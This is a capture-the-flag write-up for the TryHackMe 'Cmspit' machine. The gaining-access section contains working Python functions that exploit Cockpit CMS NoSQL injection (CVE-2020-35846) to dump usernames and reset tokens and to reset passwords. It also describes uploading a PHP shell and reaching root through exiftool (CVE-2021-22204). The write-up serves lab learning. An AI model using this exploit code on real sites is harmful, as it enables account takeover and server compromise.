---
title: Cmspit
date: 2021-11-29 11:11:11 +/-TTTT
categories: [CTF, tryhackme]
tags: [cms, mongodb,nosql injection,CVE-2020-35846,CVE-2021-22204, exiftool]
---

This is a machine that allows you to practice web app hacking and privilege escalation using recent vulnerabilities.

|Machine Name | Date | Level | Type |
|-------------|-------|------|------|
| Cmspit | 2021 30 Nov 2021 | Medium | ctf |

![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/af878fdc94fd054dd34b05b7977a6c09.png)


## Reconnaissance

As always start with Nmap.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 11:09 EST
Nmap scan report for 10.10.29.223
Host is up (0.32s latency).

PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  ssl/http Apache/2.4.18 (Ubuntu)
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.16 seconds


```

We got two services to attack. ssh and HTTP. generally, HTTP is more prone to be vulnerable, lets start with HTTP :

### http

When we go-to IP address, we got a login page. On the login page, we find out that it uses `cockpit` cms. the cockpit is an open-source content management system.

![login](/assets/thm/cmspit/login.png)

and looking at page source code found out the cms version: `0.11.1`

![version](/assets/thm/cmspit/version.png)

A quick `searchsploit` search and we found an exploit.

![searchsploit](/assets/thm/cmspit/searchsploit.png)

This exploit enumerates the username and resets the password for the user using NoSQL Injection.

## Gaining Access

Let's understand the exploit before running it.

exploit code target the `/auth/check `. after checking the code we know that there is an issue with `user` parameter. it does not check if the user provides the genuine username or other objects. here if feed the other objects it will be parsed by MongoDB shell and run as a query.

![code](https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_authenticate_src.png)

`/auth/check` code.


### Username Enumeration

```
def enumerate_users(url):
    print("[-] Attempting Username Enumeration (CVE-2020-35846) : \n")
    url = url + "/auth/requestreset"
    headers = {
        "Content-Type": "application/json"
    }
    data= {"user":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("[+] Users Found : " + str(matches))
        return matches
    else:
        print("No users found")

```

Exploit code send the request to `/auth/requestreset` (`/auth/check` is also vulnerable ) and send data as `{"user":{"$func":"var_dump"}}` to retrive the all users.

`var_dump`: var_dump is a PHP function that dumps info about one or more variables.

![user_dump](/assets/thm/cmspit/user_dump.png)

We got four users.

1. admin
2. sdarkStar7471
3. skidy
4. ekoparty

### get token for reset password

`/auth/resetpassword` is responsible for a user password reset.

![code](https://swarm.ptsecurity.com/wp-content/uploads/2021/04/cockpit_auth_resetpassword_src.png)

Like `user` parameter, `token` parameter also does not filter anything. so we can use the previous method (`var_dump`) to extract the existing tokens.

```python3
def reset_tokens(url):
    print("[+] Finding Password reset tokens")
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":{"$func":"var_dump"}}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    pattern=re.compile(r'string\(\d{1,2}\)\s*"([\w-]+)"', re.I)
    matches = pattern.findall(req.content.decode('utf-8'))
    if matches:
        print ("\t Tokens Found : " + str(matches))
        return matches
    else:
        print("No tokens found, ")

```

### Reset password

```python3
def password_reset(url, token, user):
    print("[-] Attempting to reset %s's password:" %user)
    characters = string.ascii_letters + string.digits + string.punctuation 
    password = ''.join(random.choice(characters) for i in range(10))
    url = url + "/auth/resetpassword"
    headers = {
        "Content-Type": "application/json"
        }
    data= {"token":token, "password":password}
    req = requests.post(url, data=json.dumps(data), headers=headers)
    if "success" in req.content.decode('utf-8'):
        print("[+] Password Updated Succesfully!")
        print("[+] The New credentials for %s is: \n \t Username : %s \n \t Password : %s" % (user, user, password))

```

It will send the token and new password and the application change the account password by using the `/auth/resetpassword` method.

![password.png](/assets/thm/cmspit/password.png)

Now we have the new password and username. we can log in to the box.

go to `http://10.10.3.161/finder` and upload a PHP shell.

Got shell as www-data

![wwwdata](/assets/thm/cmspit/wwwdata.png)


## Privilege Escalation

### www-data to stux.

after some enumeration we found a user on box `stux` and in his home directory found a file called `.dbshell`.

this file has a password for stux.


`stux: p****************3`


Log in as stux using the above password.

```bash
stux@ubuntu:~$ whoami
whoami
stux

```

### stux to root.

stux can run `exiftool` as root.

from here we can get only `root.txt` and stop or we can get the actual root shell. we go with the second option because why not.

So after some more enumeration, I found that `exiftool` is vulnerable to `CVE-2021-22204`.

![dejavu](/assets/thm/cmspit/dejavu.png)

```bash
root@ubuntu:~# whoami
root

```

## Resources

[From 0 to RCE: Cockpit CMS](https://swarm.ptsecurity.com/rce-cockpit-cms/)

[A case study on CVE-2021-22204 – Exiftool RCE](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)